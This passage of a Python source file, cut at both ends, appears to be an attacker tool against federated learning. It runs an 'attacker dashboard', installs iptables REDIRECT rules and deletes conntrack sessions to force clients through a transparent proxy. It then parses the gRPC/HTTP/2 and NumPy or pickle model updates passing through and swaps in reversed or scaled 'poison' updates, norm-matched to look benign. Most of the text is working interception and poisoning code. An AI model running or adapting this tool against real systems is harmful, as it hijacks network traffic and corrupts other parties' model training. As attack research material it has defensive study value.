 function line(arr,max,color){ctx.strokeStyle=color;ctx.lineWidth=3;ctx.beginPath();arr.forEach((v,i)=>{const x=arr.length<=1?0:i*w/(MAX_POINTS-1),y=h-10-(v/max)*(h-20);i?ctx.lineTo(x,y):ctx.moveTo(x,y)});ctx.stroke();}
 line(trafficSeries,maxT,"#56b8ff");line(modifiedSeries,maxM,"#b69cff");
 ctx.fillStyle="#8fa8b6";ctx.font="12px sans-serif";ctx.fillText("traffic B/s",10,18);ctx.fillStyle="#56b8ff";ctx.fillRect(92,10,18,3);ctx.fillStyle="#8fa8b6";ctx.fillText("modified cumulative",130,18);ctx.fillStyle="#b69cff";ctx.fillRect(245,10,18,3);
}
function kvHtml(obj){return Object.entries(obj).map(([k,v])=>`<div>${esc(k)}</div><div class="mono">${esc(v)}</div>`).join("");}
async function refresh(){
 try{
  const s=await fetch("/api/state",{cache:"no-store"}).then(r=>r.json());
  setText("statusText",s.status+(s.status_detail?` — ${s.status_detail}`:"")); setText("uptime",fmtDur(s.uptime_s));
  const dot=document.getElementById("statusDot"); dot.style.background=s.status==="running"?"#46d39a":s.status==="stopped"?"#ff6b6b":"#ffc857";
  setText("attackPhase",String(s.attack.phase||"—").replaceAll("_"," "));
  setText("phaseHint",s.configuration.live_poison?"phase-gated update-space rewriting enabled":"capture-only mode");
  setText("targetSeen",s.attack.target_messages_seen); setText("targetModified",s.attack.target_messages_modified);
  setText("modifiedRate",pct(s.attack.overall_modification_rate)+" of target messages");
  setText("activeConnections",s.aggregate.active_connections); setText("targetConnections",`${s.aggregate.active_target_connections} active target sessions`);
  setText("throughput",fmtRate(s.aggregate.current_rate_Bps)); setText("totalTraffic",fmtBytes(s.aggregate.total_bytes)+" total");
  setText("parseErrors",s.aggregate.parse_errors); setText("bypassCount",`${s.preexisting_flows.length} preexisting bypass flows`);
  setText("warmupText",`${s.attack.benign_observed_estimate} observed / ${s.configuration.warmup} configured`);
  setText("coverageText",pct(s.attack.post_warmup_delivery_coverage));
  setText("attackType",`${s.configuration.attack_type} / raw=${s.configuration.raw_attack}`);
  setText("targets",s.configuration.poison_targets.join(", "));
  setText("aggressiveness",s.configuration.aggressiveness);
  setText("modelMessages",s.attack.model_messages_found||0);
  setText("phaseGateOpen",`${s.attack.phase_gate_open_messages||0} open / ${s.attack.phase_gate_blocked_messages||0} blocked`);
  setText("globalMatches",s.attack.global_model_matches||0);
  setText("updateSpaceMessages",s.attack.update_space_messages||0);
  document.getElementById("warmupBar").style.width=`${Math.min(100,Math.max(0,s.attack.warmup_progress*100))}%`;
  setText("effectivenessNote",s.attack.effectiveness_note);
  setText("endpoint",s.endpoint.ip?`${s.endpoint.ip}:${s.endpoint.port} (${s.endpoint.source})`:"waiting");
  setText("interceptor",`${s.configuration.interface}:${s.configuration.proxy_port}`);
  const fp=s.fl_phase||{};
  const phase=String(fp.current||"UNKNOWN");
  const phaseEl=document.getElementById("instantPhase");
  phaseEl.textContent=phase.replaceAll("_"," ");
  phaseEl.className=`phaseName ${phaseClass(phase)}`;
  setText("instantRound",fp.round===""||fp.round==null?"—":fp.round);
  setText("instantConfidence",confidenceText(fp.confidence));
  setText("instantPhaseAge",fp.phase_age_s==null?"—":fmtDur(fp.phase_age_s));
  setText("instantPhaseSource",fp.source||"—");
  setText(
    "instantPhaseStatus",
    fp.stale
      ? "Detector metadata is stale or unavailable"
      : `Live detector update${fp.client_ip?` for ${fp.client_ip}`:""}${fp.window_id?` · window ${fp.window_id}`:""}`
  );
  const history=(fp.history||[]).slice().reverse();
  document.getElementById("phaseTimeline").innerHTML=history.length
    ? history.map((h,i)=>`<div class="phaseStep ${i===0?"active":""}"><div class="label">${new Date(h.time*1000).toLocaleTimeString()}</div><div class="${phaseClass(h.phase)}" style="font-weight:700;margin-top:3px">${esc(String(h.phase||"UNKNOWN").replaceAll("_"," "))}</div><div class="small">round ${esc(h.round??"—")} · ${esc(confidenceText(h.confidence))}${h.client_ip?` · ${esc(h.client_ip)}`:""}</div></div>`).join("")
    : '<div class="phaseStep"><div class="small">No phase transitions received yet.</div></div>';

  setText("snifferPhase",phase.replaceAll("_"," "));
  setText("snifferRound",fp.round??"unknown");
  setText("snifferConfidence",confidenceText(fp.confidence));
  setText("metadataAge",fp.metadata_age_s==null?"—":`${Number(fp.metadata_age_s).toFixed(1)}s`);
  const eng=Object.fromEntries(Object.entries(s.engine||{}).filter(([k])=>k!=="updated_at"));
  document.getElementById("engineKv").innerHTML=Object.keys(eng).length?kvHtml(eng):"<div>Status</div><div>Waiting for engine activity</div>";
  const cfg={Interface:s.configuration.interface,"Client subnet":s.configuration.client_subnet,"Proxy port":s.configuration.proxy_port,"Capture dir":s.configuration.capture_dir,"Alpha":s.configuration.alpha,"Warm-up":s.configuration.warmup,"Window":s.configuration.window,"Message range":`${s.configuration.start_message}…${s.configuration.end_message}`};
  document.getElementById("configKv").innerHTML=kvHtml(cfg);
  const body=document.getElementById("connectionsBody");
  body.innerHTML=s.connections.length?s.connections.map(c=>`<tr><td class="mono">${esc(c.client_ip)}:${esc(c.client_port)}</td><td>${c.target?'<span class="badge bad">target</span>':'<span class="badge">unchanged</span>'}</td><td><span class="${phaseClass(c.fl_phase)}">${esc(String(c.fl_phase||"UNKNOWN").replaceAll("_"," "))}</span><div class="small">${c.phase_age_s==null?"":fmtDur(c.phase_age_s)}</div></td><td>${esc(c.fl_round??"—")}</td><td>${esc(c.state)}</td><td>${esc(c.protocol)}</td><td>${fmtDur(c.elapsed_s)}</td><td>${fmtBytes(c.client_to_server_bytes)}</td><td>${fmtBytes(c.server_to_client_bytes)}</td><td>${c.grpc_messages_seen}</td><td>${c.grpc_messages_modified}</td><td>${c.parse_errors}</td></tr>`).join(""):'<tr><td colspan="12" class="small">No intercepted sessions yet.</td></tr>';
  const ev=document.getElementById("events"); ev.innerHTML=(s.recent_events||[]).slice().reverse().map(e=>`<div class="event ${esc(e.level)}"><span class="t">${new Date(e.time*1000).toLocaleTimeString()}</span> [${esc(e.level)}] ${esc(e.message)}</div>`).join("");
  trafficSeries.push(Number(s.aggregate.current_rate_Bps||0));modifiedSeries.push(Number(s.attack.target_messages_modified||0));if(trafficSeries.length>MAX_POINTS){trafficSeries.shift();modifiedSeries.shift();}drawChart();
 }catch(e){setText("statusText","dashboard API unavailable");}
}
refresh();setInterval(refresh,1000);
</script>
</body></html>"""


class AttackerDashboardHandler(BaseHTTPRequestHandler):
    server_version = "AttackerDashboard/2.0"

    def _send(self, status: int, content_type: str, payload: bytes) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self) -> None:
        route = urlparse(self.path).path
        state = _get_dashboard_state()
        if route == "/":
            self._send(200, "text/html; charset=utf-8", _ATTACKER_DASHBOARD_HTML.encode("utf-8"))
            return
        if route == "/api/state":
            payload = state.snapshot() if state is not None else {"status": "unavailable"}
            self._send(
                200,
                "application/json; charset=utf-8",
                json.dumps(payload, separators=(",", ":")).encode("utf-8"),
            )
            return
        if route == "/api/health":
            self._send(200, "application/json", b'{"ok":true}')
            return
        self._send(404, "text/plain; charset=utf-8", b"Not found")

    def log_message(self, format, *args) -> None:
        return


def start_attacker_dashboard(
    state: AttackerDashboardState,
    args: argparse.Namespace,
    stop_event: threading.Event,
):
    if not bool(getattr(args, "dashboard", True)):
        return None

    host = str(getattr(args, "dashboard_host", "127.0.0.1") or "127.0.0.1")
    preferred = int(getattr(args, "dashboard_port", 8765) or 8765)
    server = None
    last_error = None

    ports = [0] if preferred == 0 else list(range(preferred, preferred + 25))
    for port in ports:
        try:
            server = ThreadingHTTPServer((host, port), AttackerDashboardHandler)
            break
        except OSError as exc:
            last_error = exc
            continue

    if server is None:
        logger.warning("Attacker dashboard could not start: %s", last_error)
        return None

    actual_host, actual_port = server.server_address[:2]
    display_host = "127.0.0.1" if actual_host in {"0.0.0.0", "::"} else actual_host
    url = f"http://{display_host}:{actual_port}"
    state.set_dashboard_url(url)

    if host not in {"127.0.0.1", "::1", "localhost"}:
        logger.warning(
            "Dashboard is bound to %s and may be reachable by other hosts. "
            "Use 127.0.0.1 unless remote access is intentional.",
            host,
        )

    def serve() -> None:
        logger.info("[DASHBOARD] attacker dashboard available at %s", url)
        try:
            server.serve_forever(poll_interval=0.5)
        except Exception as exc:
            if not stop_event.is_set():
                logger.warning("[DASHBOARD] HTTP server ended: %s", exc)

    def shutdown_when_stopped() -> None:
        stop_event.wait()
        try:
            server.shutdown()
            server.server_close()
        except Exception:
            pass

    threading.Thread(target=serve, daemon=True, name="attacker-dashboard-http").start()
    threading.Thread(target=shutdown_when_stopped, daemon=True, name="attacker-dashboard-stop").start()
    return server


_dashboard_log_handler = DashboardLogHandler()
_dashboard_log_handler.setFormatter(logging.Formatter("%(message)s"))
logging.getLogger().addHandler(_dashboard_log_handler)


@dataclass
class ServerEndpoint:
    ip: str
    port: int
    source: str


class ServerLearner:
    """Learns the real FL server endpoint from UDP metadata sent by sniffer/analyzer."""

    def __init__(self, fallback_ip: str, fallback_port: int, allow_update: bool = False):
        self.endpoint: Optional[ServerEndpoint] = None
        if fallback_ip:
            self.endpoint = ServerEndpoint(str(fallback_ip).strip(), int(fallback_port), "argument")
        self.default_port = int(fallback_port or 8080)
        self.allow_update = bool(allow_update)
        self.cv = threading.Condition()

    def update(self, server_ip: str, server_port: int, source: str) -> None:
        server_ip = str(server_ip or "").strip()
        if not server_ip or server_ip.lower() in {"unknown", "none", "null"}:
            return
        try:
            ipaddress.ip_address(server_ip)
        except Exception:
            return

        try:
            server_port = int(server_port or self.default_port)
        except Exception:
            server_port = self.default_port
        if server_port <= 0 or server_port > 65535:
            server_port = self.default_port

        with self.cv:
            if self.endpoint and not self.allow_update:
                return
            old = (self.endpoint.ip, self.endpoint.port) if self.endpoint else None
            new = (server_ip, server_port)
            self.endpoint = ServerEndpoint(server_ip, server_port, str(source or "server_announce"))
            if old != new:
                logger.info("[SERVER-LEARN] upstream=%s:%s source=%s", server_ip, server_port, self.endpoint.source)
            self.cv.notify_all()

    def wait(self, timeout_s: float) -> Optional[ServerEndpoint]:
        with self.cv:
            if self.endpoint:
                return self.endpoint
            deadline = time.time() + float(timeout_s)
            while not self.endpoint:
                remaining = deadline - time.time()
                if remaining <= 0:
                    return None
                logger.info("Waiting for upstream server_ip from sniffer/analyzer metadata...")
                self.cv.wait(timeout=min(remaining, 2.0))
            return self.endpoint

    def get(self) -> Optional[ServerEndpoint]:
        with self.cv:
            return self.endpoint


def run_cmd(cmd: List[str], check: bool = False, quiet: bool = False) -> subprocess.CompletedProcess:
    if not quiet:
        logger.debug("CMD: %s", " ".join(cmd))
    return subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=check)


def command_exists(name: str) -> bool:
    return subprocess.run(["sh", "-c", f"command -v {name} >/dev/null 2>&1"]).returncode == 0


def detect_interface_ipv4(interface: str) -> Tuple[str, str]:
    """Return (ip, cidr), for example ('10.42.0.1', '10.42.0.1/24')."""
    try:
        result = run_cmd(["ip", "-4", "addr", "show", interface], quiet=True)
        match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+/\d+)", result.stdout)
        if not match:
            return "unknown", "unknown"
        iface = ipaddress.ip_interface(match.group(1))
        return str(iface.ip), str(iface)
    except Exception:
        return "unknown", "unknown"


def cidr_to_network(cidr: str) -> str:
    try:
        return str(ipaddress.ip_interface(cidr).network)
    except Exception:
        return ""


def parse_csv_set(value: str) -> set:
    return {item.strip() for item in str(value or "").split(",") if item.strip()}


class CleanupManager:
    """Installs/removes transparent redirect and optional cleanup rules."""

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.lock = threading.RLock()
        self.installed_nat_rules: List[List[str]] = []
        self.cleaned = False

    def _iptables_base_rule(self, target_ip: str, target_port: int) -> List[str]:
        rule = [
            "-i", self.args.interface,
            "-p", "tcp",
            "-s", self.args.client_subnet,
            "-d", target_ip,
            "--dport", str(target_port),
            "-j", "REDIRECT",
            "--to-ports", str(self.args.proxy_port),
        ]
        return rule

    def _rule_exists(self, table: str, chain: str, rule: List[str]) -> bool:
        return run_cmd(["iptables", "-t", table, "-C", chain] + rule, quiet=True).returncode == 0

    def _delete_rule_until_absent(self, table: str, chain: str, rule: List[str]) -> int:
        deleted = 0
        while self._rule_exists(table, chain, rule):
            result = run_cmd(["iptables", "-t", table, "-D", chain] + rule, quiet=True)
            if result.returncode != 0:
                break
            deleted += 1
        return deleted

    def install_transparent_redirect(self, target_ip: str, target_port: int) -> None:
        if os.geteuid() != 0:
            raise SystemExit("Transparent mode requires root. Run with sudo.")
        if not command_exists("iptables"):
            raise SystemExit("iptables command not found. Install iptables or disable --install-iptables.")

        rule = self._iptables_base_rule(target_ip, target_port)
        with self.lock:
            # Remove stale exact rules from previous interrupted runs before adding one clean rule.
            stale = self._delete_rule_until_absent("nat", "PREROUTING", rule)
            if stale:
                logger.info("Removed %d stale transparent redirect rule(s) before installing new rule", stale)

            result = run_cmd(["iptables", "-t", "nat", "-I", "PREROUTING", "1"] + rule, quiet=True)
            if result.returncode != 0:
                raise RuntimeError(f"iptables install failed: {result.stderr.strip()}")
            self.installed_nat_rules.append(rule)
            logger.info(
                "Installed transparent redirect: iface=%s src=%s dst=%s:%s -> local_port=%s",
                self.args.interface, self.args.client_subnet, target_ip, target_port, self.args.proxy_port,
            )

    def cleanup_tc(self) -> None:
        interfaces = [item.strip() for item in str(self.args.cleanup_interfaces or "").split(",") if item.strip()]
        if self.args.interface and self.args.interface not in interfaces:
            interfaces.append(self.args.interface)
        for dev in interfaces:
            run_cmd(["tc", "qdisc", "del", "dev", dev, "root"], quiet=True)
            run_cmd(["tc", "qdisc", "del", "dev", dev, "ingress"], quiet=True)
        run_cmd(["tc", "qdisc", "del", "dev", "ifb0", "root"], quiet=True)
        run_cmd(["ip", "link", "set", "ifb0", "down"], quiet=True)

    def cleanup_conntrack(self) -> None:
        if command_exists("conntrack"):
            run_cmd(["conntrack", "-F"], quiet=True)

    def cleanup(self, reason: str = "exit") -> None:
        with self.lock:
            if self.cleaned:
                return
            self.cleaned = True
            logger.info("Cleanup started: %s", reason)

            # Delete all exact redirect rules managed by this program.
            for rule in list(self.installed_nat_rules):
                deleted = self._delete_rule_until_absent("nat", "PREROUTING", rule)
                if deleted:
                    logger.info("Removed %d transparent redirect rule(s)", deleted)
            self.installed_nat_rules.clear()

            # Also remove exact rule based on current args, in case shutdown happened before tracking.
            try:
                target_ip = self.args.target_server_ip or self.args.server_ip
                target_port = int(self.args.target_server_port or self.args.port)
                if target_ip:
                    rule = self._iptables_base_rule(target_ip, target_port)
                    deleted = self._delete_rule_until_absent("nat", "PREROUTING", rule)
                    if deleted:
                        logger.info("Removed %d fallback exact redirect rule(s)", deleted)
            except Exception:
                pass

            if self.args.cleanup_tc:
                self.cleanup_tc()

            if self.args.cleanup_mangle:
                run_cmd(["iptables", "-t", "mangle", "-F"], quiet=True)
                run_cmd(["iptables", "-t", "mangle", "-X"], quiet=True)
                logger.info("Flushed iptables mangle table")

            if self.args.flush_conntrack:
                self.cleanup_conntrack()
                logger.info("Flushed conntrack table")

            logger.info("Cleanup complete")



def audit_existing_direct_fl_connections(target_ip: str, target_port: int) -> List[str]:
    """Return conntrack rows for FL sessions created before REDIRECT installation."""
    if not command_exists("conntrack"):
        return []
    result = run_cmd(
        ["conntrack", "-L", "-p", "tcp", "-d", str(target_ip),
         "--dport", str(int(target_port))],
        quiet=True,
    )
    if result.returncode not in (0, 1):
        return []
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]


def delete_existing_direct_fl_connections(target_ip: str, target_port: int) -> Tuple[int, List[str]]:
    """Delete only conntrack entries for the FL destination and re-audit.

    This deliberately avoids ``conntrack -F`` so unrelated router flows are
    not disturbed.  Existing client TCP sessions will be broken and must
    reconnect; the replacement sessions will then traverse the REDIRECT rule.
    """
    before = audit_existing_direct_fl_connections(target_ip, target_port)
    if not before or not command_exists("conntrack"):
        return 0, before
    result = run_cmd(
        ["conntrack", "-D", "-p", "tcp", "-d", str(target_ip),
         "--dport", str(int(target_port))],
        quiet=True,
    )
    if result.returncode not in (0, 1):
        logger.error(
            "Scoped conntrack deletion failed rc=%s stderr=%s",
            result.returncode,
            (result.stderr or "").strip(),
        )
    time.sleep(0.25)
    remaining = audit_existing_direct_fl_connections(target_ip, target_port)
    removed = max(0, len(before) - len(remaining))
    return removed, remaining


class ProxyState:
    """Minimal controlled poison generator for length-prefixed pickle only."""

    def __init__(self):
        self.lock = threading.RLock()
        self.round_count = 0
        self.benign_updates = []
        self.attack_ready = False
        self.poisoned_payload = None

    def compute_norm(self, update: dict) -> float:
        total = 0.0
        if np is None:
            return 0.0
        for value in update.values():
            if hasattr(value, "__array__"):
                arr = np.asarray(value, dtype=float)
                total += float((arr * arr).sum())
        return total ** 0.5

    def generate_poison(self, benign_update: dict, attack_strength: float, attack_type: str) -> dict:
        poison = {}
        for key, value in benign_update.items():
            if hasattr(value, "__array__"):
                poison[key] = -value * attack_strength if attack_type == "reversal" else value * attack_strength
            else:
                poison[key] = value

        history = self.benign_updates or [benign_update]
        norms = [self.compute_norm(u) for u in history]
        target_norm = sum(norms) / max(len(norms), 1)
        poison_norm = self.compute_norm(poison)
        if target_norm > 0 and poison_norm > 0:
            scale = target_norm / poison_norm
            for key, value in poison.items():
                if hasattr(value, "__array__"):
                    poison[key] = value * scale
        return poison

    def process_upload(self, data: bytes, attack_after: int, attack_strength: float, attack_type: str) -> bytes:
        try:
            update = pickle.loads(data)
        except Exception:
            return data
        if not isinstance(update, dict) or not update:
            return data

        with self.lock:
            self.round_count += 1
            self.benign_updates.append(update)
            if len(self.benign_updates) > 10:
                self.benign_updates.pop(0)

            if self.round_count <= attack_after:
                logger.info("Round %d: pickle update profiled", self.round_count)
                return data

            if not self.attack_ready:
                self.poisoned_payload = self.generate_poison(update, attack_strength, attack_type)
                self.attack_ready = True
                logger.info("POISON GENERATED for pickle protocol")

            if self.poisoned_payload is not None:
                logger.info("*** POISON SUBSTITUTE SENT at pickle round %d type=%s ***", self.round_count, attack_type)
                return pickle.dumps(self.poisoned_payload)
        return data


class ConnectionLimiter:
    """Capacity guard that waits instead of rejecting redirected clients."""

    def __init__(self, max_connections: int, max_per_client: int):
        self.sem = threading.BoundedSemaphore(max(1, int(max_connections)))
        self.max_per_client = max(1, int(max_per_client))
        self.cv = threading.Condition(threading.RLock())
        self.by_client: Dict[str, int] = {}

    def acquire(self, client_ip: str) -> bool:
        # A redirected FL connection must never be dropped merely because the
        # proxy is briefly at its configured capacity. Wait for a slot.
        self.sem.acquire()
        with self.cv:
            while self.by_client.get(client_ip, 0) >= self.max_per_client:
                self.cv.wait(timeout=0.5)
            self.by_client[client_ip] = self.by_client.get(client_ip, 0) + 1
        return True

    def release(self, client_ip: str) -> None:
        with self.cv:
            current = self.by_client.get(client_ip, 0)
            if current <= 1:
                self.by_client.pop(client_ip, None)
            else:
                self.by_client[client_ip] = current - 1
            self.cv.notify_all()
        try:
            self.sem.release()
        except ValueError:
            pass


def start_server_metadata_listener(host: str, port: int, learner: ServerLearner, default_port: int, stop_event: threading.Event) -> threading.Thread:
    def run():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.settimeout(0.5)
        logger.info("Server metadata UDP listener on %s:%s", host, port)
        try:
            while not stop_event.is_set():
                try:
                    packet, _addr = sock.recvfrom(65535)
                    data = json.loads(packet.decode("utf-8", errors="ignore"))
                    dashboard_update_metadata(data)
                    server_ip = data.get("server_ip") or data.get("fl_server_ip") or data.get("target_server_ip")
                    server_port = data.get("server_port") or data.get("fl_port") or data.get("target_port") or default_port
                    source = str(data.get("command") or data.get("type") or "server_announce")
                    if server_ip:
                        learner.update(server_ip, int(server_port), source)
                except socket.timeout:
                    continue
                except Exception as exc:
                    logger.debug("Ignoring server metadata packet: %s", exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    thread = threading.Thread(target=run, daemon=True, name="server-metadata-listener")
    thread.start()
    return thread


def client_allowed(client_ip: str, args: argparse.Namespace) -> Tuple[bool, str]:
    client_ip = str(client_ip or "").strip()

    blocked = parse_csv_set(getattr(args, "blocked_clients", ""))
    if client_ip in blocked:
        return False, "client_ip_explicitly_blocked"

    allowed_ips = parse_csv_set(getattr(args, "allowed_clients", ""))
    if allowed_ips and client_ip not in allowed_ips:
        return False, "client_ip_not_in_allowed_clients"

    subnet = str(getattr(args, "client_subnet", "") or "").strip()
    if subnet:
        try:
            if ipaddress.ip_address(client_ip) not in ipaddress.ip_network(subnet, strict=False):
                return False, f"client_ip_not_in_client_subnet_{subnet}"
        except Exception as exc:
            return False, f"invalid_client_subnet_{subnet}: {exc}"

    return True, "accepted"


def client_should_be_poisoned(client_ip: str, args: argparse.Namespace) -> bool:
    """Compatibility wrapper for target authorization."""
    targeted, _source, _meta = poison_target_decision(client_ip, args)
    return bool(targeted)


def recv_exact(sock: socket.socket, num_bytes: int) -> Optional[bytes]:
    data = b""
    while len(data) < num_bytes:
        chunk = sock.recv(num_bytes - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def close_quietly(sock: Optional[socket.socket]) -> None:
    if sock is None:
        return
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except Exception:
        pass
    try:
        sock.close()
    except Exception:
        pass



@dataclass
class ConnectionStats:
    client_ip: str
    client_port: int
    server_ip: str
    server_port: int
    start_time: float = time.time()
    c2s_bytes: int = 0
    s2c_bytes: int = 0
    c2s_chunks: int = 0
    s2c_chunks: int = 0
    closed_c2s: bool = False
    closed_s2c: bool = False
    lock: threading.RLock = None

    def __post_init__(self) -> None:
        self.start_time = time.time()
        self.lock = threading.RLock()

    def add(self, direction: str, nbytes: int) -> None:
        with self.lock:
            if direction == "client->server":
                self.c2s_bytes += int(nbytes)
                self.c2s_chunks += 1
            else:
                self.s2c_bytes += int(nbytes)
                self.s2c_chunks += 1

    def mark_closed(self, direction: str) -> None:
        with self.lock:
            if direction == "client->server":
                self.closed_c2s = True
            else:
                self.closed_s2c = True

    def snapshot(self) -> dict:
        with self.lock:
            elapsed = max(time.time() - self.start_time, 1e-9)
            total = self.c2s_bytes + self.s2c_bytes
            return {
                "client_ip": self.client_ip,
                "client_port": self.client_port,
                "server_ip": self.server_ip,
                "server_port": self.server_port,
                "elapsed_s": elapsed,
                "client_to_server_bytes": self.c2s_bytes,
                "server_to_client_bytes": self.s2c_bytes,
                "total_bytes": total,
                "client_to_server_chunks": self.c2s_chunks,
                "server_to_client_chunks": self.s2c_chunks,
                "client_to_server_closed": self.closed_c2s,
                "server_to_client_closed": self.closed_s2c,
                "throughput_Bps": total / elapsed,
            }

    def log_summary(self, prefix: str = "summary") -> None:
        snap = self.snapshot()
        logger.info(
            "[%s] %s elapsed=%.3fs c2s=%dB s2c=%dB total=%dB c2s_chunks=%d s2c_chunks=%d avg_rate=%.1fB/s",
            self.client_ip,
            prefix,
            snap["elapsed_s"],
            snap["client_to_server_bytes"],
            snap["server_to_client_bytes"],
            snap["total_bytes"],
            snap["client_to_server_chunks"],
            snap["server_to_client_chunks"],
            snap["throughput_Bps"],
        )


def start_periodic_stats_logger(stats: ConnectionStats, interval_s: float, stop_event: threading.Event) -> threading.Thread:
    def run() -> None:
        while not stop_event.wait(max(float(interval_s), 0.5)):
            stats.log_summary("live")
    thread = threading.Thread(target=run, daemon=True, name=f"stats-{stats.client_ip}-{stats.client_port}")
    thread.start()
    return thread

class StreamCapture:
    def __init__(self, enabled: bool, capture_dir: str, max_bytes_per_direction: int):
        self.enabled = bool(enabled)
        self.capture_dir = Path(capture_dir) if capture_dir else None
        self.max_bytes = int(max_bytes_per_direction)
        if self.enabled and self.capture_dir:
            self.capture_dir.mkdir(parents=True, exist_ok=True)

    def open_pair(self, client_ip: str, client_port: int) -> Tuple[Optional[object], Optional[object]]:
        if not self.enabled or not self.capture_dir:
            return None, None
        ts = time.strftime("%Y%m%d_%H%M%S")
        safe_ip = client_ip.replace(".", "_")
        base = f"{ts}_{safe_ip}_{client_port}"
        c2s_path = self.capture_dir / f"{base}_client_to_server.bin"
        s2c_path = self.capture_dir / f"{base}_server_to_client.bin"
        c2s = open(c2s_path, "ab")
        s2c = open(s2c_path, "ab")
        logger.info("[%s] capture enabled c2s=%s s2c=%s", client_ip, c2s_path, s2c_path)
        return c2s, s2c

    def write_metadata(self, client_ip: str, client_port: int, server_ip: str, server_port: int, protocol: str, stats: Optional[ConnectionStats] = None) -> None:
        if not self.enabled or not self.capture_dir:
            return
        ts = time.strftime("%Y%m%d_%H%M%S")
        safe_ip = client_ip.replace(".", "_")
        meta_path = self.capture_dir / f"{ts}_{safe_ip}_{client_port}_metadata.json"
        payload = {
            "timestamp": ts,
            "client_ip": client_ip,
            "client_port": client_port,
            "server_ip": server_ip,
            "server_port": server_port,
            "protocol": protocol,
        }
        if stats is not None:
            payload["stats"] = stats.snapshot()
        try:
            with open(meta_path, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=2)
            logger.info("[%s] capture metadata=%s", client_ip, meta_path)
        except Exception as exc:
            logger.debug("[%s] metadata write failed: %s", client_ip, exc)

    def write(self, handle: Optional[object], data: bytes, written: int) -> int:
        if not handle or not data:
            return written
        if self.max_bytes > 0 and written >= self.max_bytes:
            return written
        chunk = data
        if self.max_bytes > 0:
            chunk = data[: max(0, self.max_bytes - written)]
        if chunk:
            handle.write(chunk)
            handle.flush()
            written += len(chunk)
        return written

    @staticmethod
    def close(handle: Optional[object]) -> None:
        if handle:
            try:
                handle.close()
            except Exception:
                pass


def relay_stream(
    src: socket.socket,
    dst: socket.socket,
    client_ip: str,
    label: str,
    first_bytes: bytes = b"",
    capture: Optional[StreamCapture] = None,
    capture_handle: Optional[object] = None,
    stats: Optional[ConnectionStats] = None,
) -> None:
    written = 0
    direction_bytes = 0
    direction_chunks = 0
    try:
        if first_bytes:
            if capture:
                written = capture.write(capture_handle, first_bytes, written)
            dst.sendall(first_bytes)
            direction_bytes += len(first_bytes)
            direction_chunks += 1
            if stats:
                stats.add(label, len(first_bytes))
        while True:
            chunk = src.recv(64 * 1024)
            if not chunk:
                break
            if capture:
                written = capture.write(capture_handle, chunk, written)
            dst.sendall(chunk)
            direction_bytes += len(chunk)
            direction_chunks += 1
            if stats:
                stats.add(label, len(chunk))
    except Exception as exc:
        logger.debug("[%s] raw relay %s ended: %s", client_ip, label, exc)
    finally:
        if stats:
            stats.mark_closed(label)
        logger.info("[%s] raw relay %s closed bytes=%d chunks=%d captured_bytes=%d", client_ip, label, direction_bytes, direction_chunks, written)
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass
        if capture:
            capture.close(capture_handle)



# ---------------------------------------------------------------------------
# Live Flower/gRPC HTTP/2 length-preserving NumPy payload poisoning
# ---------------------------------------------------------------------------

HTTP2_CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
NPY_MAGIC = b"\x93NUMPY"


@dataclass
class LivePoisonCounters:
    grpc_messages_seen: int = 0
    grpc_messages_modified: int = 0
    arrays_found: int = 0
    arrays_modified: int = 0
    compressed_messages_skipped: int = 0
    nonfloat_arrays_skipped: int = 0
    selected_messages_skipped: int = 0
    parse_errors: int = 0
    model_messages_found: int = 0
    phase_gate_open_messages: int = 0
    phase_gate_blocked_messages: int = 0
    global_model_matches: int = 0
    update_space_messages: int = 0
    warmup_observations: int = 0


def build_http2_frame_header(length: int, frame_type: int, flags: int, stream_id: int) -> bytes:
    return int(length).to_bytes(3, "big") + bytes([frame_type & 0xFF, flags & 0xFF]) + (int(stream_id) & 0x7FFFFFFF).to_bytes(4, "big")


def read_http2_frame(sock: socket.socket) -> Optional[Tuple[bytes, int, int, int, bytes]]:
    hdr = recv_exact(sock, 9)
    if not hdr:
        return None
    length = int.from_bytes(hdr[0:3], "big")
    frame_type = hdr[3]
    flags = hdr[4]
    stream_id = int.from_bytes(hdr[5:9], "big") & 0x7FFFFFFF
    payload = recv_exact(sock, length) if length > 0 else b""
    if payload is None:
        return None
    return hdr, frame_type, flags, stream_id, payload


def parse_npy_at(buf: bytes, offset: int):
    if np is None:
        return None
    if offset < 0 or offset + 10 > len(buf):
        return None
    if buf[offset:offset + 6] != NPY_MAGIC:
        return None
    major = buf[offset + 6]
    if major == 1:
        if offset + 10 > len(buf):
            return None
        header_len = int.from_bytes(buf[offset + 8:offset + 10], "little")
        header_start = offset + 10
    elif major in (2, 3):
        if offset + 12 > len(buf):
            return None
        header_len = int.from_bytes(buf[offset + 8:offset + 12], "little")
        header_start = offset + 12
    else:
        return None
    header_end = header_start + header_len
    if header_end > len(buf):
        return None
    try:
        import ast
        import math
        header_text = buf[header_start:header_end].decode("latin1").strip()
        header = ast.literal_eval(header_text)
        dtype = np.dtype(header["descr"])
        shape = tuple(int(x) for x in header["shape"])
        fortran_order = bool(header.get("fortran_order", False))
        count = int(math.prod(shape)) if shape else 1
        data_offset = header_end
        data_end = data_offset + count * dtype.itemsize
        if data_end > len(buf):
            return None
        return data_offset, data_end, dtype, shape, fortran_order
    except Exception:
        return None



def extract_float_model_block(payload: bytes, args: argparse.Namespace):
    """Extract ordered floating NumPy tensors and exact wire ranges."""
    if np is None:
        return [], [], 0
    # Read directly from any bytes-like object (bytes, bytearray, mmap).
    # Avoid creating a full serialized-message copy for large models.
    view = payload
    specs = []
    block = []
    arrays_found = 0
    offset = 0
    while True:
        position = view.find(NPY_MAGIC, offset)
        if position < 0:
            break
